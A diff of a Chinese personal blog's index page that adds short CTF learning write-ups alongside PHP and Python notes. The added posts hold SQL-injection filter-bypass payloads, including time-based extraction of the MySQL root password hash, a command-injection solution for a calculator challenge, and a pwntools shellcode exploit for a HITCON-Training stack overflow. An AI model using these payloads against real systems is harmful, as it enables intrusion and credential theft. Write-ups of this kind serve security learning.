@@ -142,52 +142,6 @@
 
     
     <article
-  id="post-i春秋-sql绕过-wirteup"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/"
-    >i春秋 sql绕过 wirteup</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/07/25/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/" class="article-date">
-  <time datetime="2020-07-25T04:06:41.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-   
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
   id="post-i春秋-sqli-wirteup"
   class="article article-type-post"
   itemscope
@@ -199,7 +153,7 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/i%E6%98%A5%E7%A7%8B-sqli-wirteup/"
+  <a class="article-title" href="/2020/04/02/i%E6%98%A5%E7%A7%8B-sqli-wirteup/"
     >i春秋 sqli wirteup</a> 
 </h2>
  
@@ -207,60 +161,23 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2020/07/25/i%E6%98%A5%E7%A7%8B-sqli-wirteup/" class="article-date">
-  <time datetime="2020-07-25T04:06:27.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-   
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
+      <a href="/2020/04/02/i%E6%98%A5%E7%A7%8B-sqli-wirteup/" class="article-date">
+  <time datetime="2020-04-02T07:04:24.000Z" itemprop="datePublished">2020-04-02</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
   </div>
-
-    
- 
    
-</article>
-
-    
-    <article
-  id="post-i春秋-file-get-contents-wirteup"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/"
-    >i春秋 file_get_contents wirteup</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/07/25/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/" class="article-date">
-  <time datetime="2020-07-25T04:06:07.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <p>sql注入时，逗号被过滤后可用payload</p>
+<p>select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97);</p>
+<p>127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>
+<p>select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #</p>
+<p>substring((select password from mysql.user where user=’root’) from -1）=’e’</p>
+ 
       <!-- reward -->
       
     </div>
@@ -270,98 +187,8 @@
     
     <footer class="article-footer">
        
-    </footer>
-  </div>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-i春秋模拟上传wirteup"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/"
-    >i春秋模拟上传wirteup</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/07/25/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/" class="article-date">
-  <time datetime="2020-07-25T04:04:24.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-   
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-过狗一句话小技巧"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/"
-    >过狗一句话小技巧</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2020/07/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-date">
-  <time datetime="2020-07-25T04:03:03.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-   
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
     </footer>
   </div>
 
@@ -383,7 +210,7 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/"
+  <a class="article-title" href="/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/"
     >php函数学习</a> 
 </h2>
  
@@ -391,14 +218,21 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2020/07/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2020-07-25T04:00:19.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
+      <a href="/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2019-09-25T10:00:19.000Z" itemprop="datePublished">2019-09-25</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a> / <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/PHP/">PHP</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
+<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
+<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
+ 
       <!-- reward -->
       
     </div>
@@ -408,6 +242,8 @@
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
+
     </footer>
   </div>
 
@@ -429,22 +265,27 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
-    >python学习笔记</a> 
+  <a class="article-title" href="/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+    >python库</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time datetime="2020-07-25T03:58:58.000Z" itemprop="datePublished">2020-07-25</time>
-</a>    
+      <a href="/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time datetime="2019-07-25T03:58:58.000Z" itemprop="datePublished">2019-07-25</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a> / <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/Python/">Python</a>
+  </div>
+   
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <p>import  random</p>
+<h1><span id="sui-ji-zheng-shu-print-random-randint-1-50">随机整数：print random.randint(1,50)</span><a href="#sui-ji-zheng-shu-print-random-randint-1-50" class="header-anchor">#</a></h1><h1><span id="sui-ji-xuan-qu-0-dao-100-jian-de-qi-ou-shu-print-random-randrange-0-101-1-2">随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)</span><a href="#sui-ji-xuan-qu-0-dao-100-jian-de-qi-ou-shu-print-random-randrange-0-101-1-2" class="header-anchor">#</a></h1><h1><span id="sui-ji-fu-dian-shu-print-random-random-wu-fan-wei-print-random-uniform-1-10-you-fan-wei">随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</span><a href="#sui-ji-fu-dian-shu-print-random-random-wu-fan-wei-print-random-uniform-1-10-you-fan-wei" class="header-anchor">#</a></h1><h1><span id="sui-ji-zi-fu-print-random-choice-abcdefghijklmnopqrstuvwxyz-amp">随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)</span><a href="#sui-ji-zi-fu-print-random-choice-abcdefghijklmnopqrstuvwxyz-amp" class="header-anchor">#</a></h1><h1><span id="duo-ge-zi-fu-zhong-sheng-cheng-zhi-ding-shu-liang-de-sui-ji-zi-fu-print-random-sample-zyxwvutsrqponmlkjihgfedcba-5">多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)</span><a href="#duo-ge-zi-fu-zhong-sheng-cheng-zhi-ding-shu-liang-de-sui-ji-zi-fu-print-random-sample-zyxwvutsrqponmlkjihgfedcba-5" class="header-anchor">#</a></h1><h1><span id="cong-a-za-z0-9-sheng-cheng-zhi-ding-shu-liang-de-sui-ji-zi-fu-ran-str-join-random-sample-string-ascii-letters-string-digits-8-print-ran-str">从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str</span><a href="#cong-a-za-z0-9-sheng-cheng-zhi-ding-shu-liang-de-sui-ji-zi-fu-ran-str-join-random-sample-string-ascii-letters-string-digits-8-print-ran-str" class="header-anchor">#</a></h1><h1><span id="duo-ge-zi-fu-zhong-xuan-qu-zhi-ding-shu-liang-de-zi-fu-zu-cheng-xin-zi-fu-chuan-print-join-random-sample-z-y-x-w-v-u-t-s-r-q-p-o-n-m-l-k-j-i-h-g-f-e-d-c-b-a-5">多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))</span><a href="#duo-ge-zi-fu-zhong-xuan-qu-zhi-ding-shu-liang-de-zi-fu-zu-cheng-xin-zi-fu-chuan-print-join-random-sample-z-y-x-w-v-u-t-s-r-q-p-o-n-m-l-k-j-i-h-g-f-e-d-c-b-a-5" class="header-anchor">#</a></h1><h1><span id="sui-ji-xuan-qu-zi-fu-chuan-print-random-choice-jian-dao-shi-tou-bu">随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])</span><a href="#sui-ji-xuan-qu-zi-fu-chuan-print-random-choice-jian-dao-shi-tou-bu" class="header-anchor">#</a></h1><h1><span id="da-luan-pai-xu-items-1-2-3-4-5-6-7-8-9-0-print-random-shuffle-items">打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</span><a href="#da-luan-pai-xu-items-1-2-3-4-5-6-7-8-9-0-print-random-shuffle-items" class="header-anchor">#</a></h1> 
       <!-- reward -->
       
     </div>
@@ -454,6 +295,8 @@
     
     <footer class="article-footer">
        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>
+
     </footer>
   </div>
 
@@ -487,7 +330,7 @@
   <time datetime="2019-07-25T03:51:12.000Z" itemprop="datePublished">2019-07-25</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/">-数据库学习</a>
+    <a class="article-category-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/">数据库学习</a>
   </div>
    
     </div>
@@ -511,7 +354,7 @@
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mysql-%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/" rel="tag">-Mysql -函数用法</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/" rel="tag">函数用法</a></li></ul>
 
     </footer>
   </div>
@@ -624,6 +467,285 @@ io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3c
     <footer class="article-footer">
        
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
+  id="post-calc2"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/04/19/calc2/"
+    >calc2</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/04/19/calc2/" class="article-date">
+  <time datetime="2019-04-19T09:38:14.000Z" itemprop="datePublished">2019-04-19</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
+<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
+<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
+<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
+<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
+
+接着打算直接cat flag，然而并不行
+
+if(!empty($_GET)){
+$str=$_GET[&quot;calc&quot;];
+if(strpos($str,&quot;#&quot;)!==false)
+    die;
+if(strpos($str,&quot;`&quot;)!==false)
+    die;
+if(strpos($str,&quot;flag&quot;)!==false)
+    die;
+
+成了,flag被过滤了
+
+嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
+<pre><code>拿到flag</code></pre> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
+  id="post-hitcon-lab3"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/04/18/hitcon-lab3/"
+    >hitcon  lab3 </a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/04/18/hitcon-lab3/" class="article-date">
+  <time datetime="2019-04-18T13:24:46.000Z" itemprop="datePublished">2019-04-18</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>lab3这道题是一个基本的栈溢出</p>
+<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
+<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
+
+由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
+
+首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
+<pre><code>地址为0x0804A060
+
+直接上exp：
+
+from pwn import *
+
+&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
+
+context.log_level = &apos;debug&apos;
+
+io = process(&apos;ret2sc&apos;)
+
+sc = asm(shellcraft.sh())
+
+ret2 = &apos;A&apos;*32 + p32(0x0804A060)
+
+io.sendafter(&apos;Name:&apos;,sc)
+
+io.sendafter(&apos;best:&apos;,ret2)
+
+io.interactive()
+
+直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
+<pre><code>ok，拿到shell，直接cat flag就行了</code></pre> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
+  id="post-Hitcon-lab1"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/04/17/Hitcon-lab1/"
+    >Hitcon lab1</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/04/17/Hitcon-lab1/" class="article-date">
+  <time datetime="2019-04-17T12:07:14.000Z" itemprop="datePublished">2019-04-17</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
+<pre><code>Hitcon这个是le3ding大佬推给我的
+
+
+这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
+
+
+——————————分割线——————————
+
+lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
+
+用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
+<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
+<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
+
+将if(password == magic)改为if(password ！= magic)
+
+运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
+  id="post-i春秋-sql绕过-wirteup"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/"
+    >i春秋 sql绕过 wirteup</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/" class="article-date">
+  <time datetime="2018-12-12T12:06:43.000Z" itemprop="datePublished">2018-12-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
+<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
+<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
     </footer>
   </div>
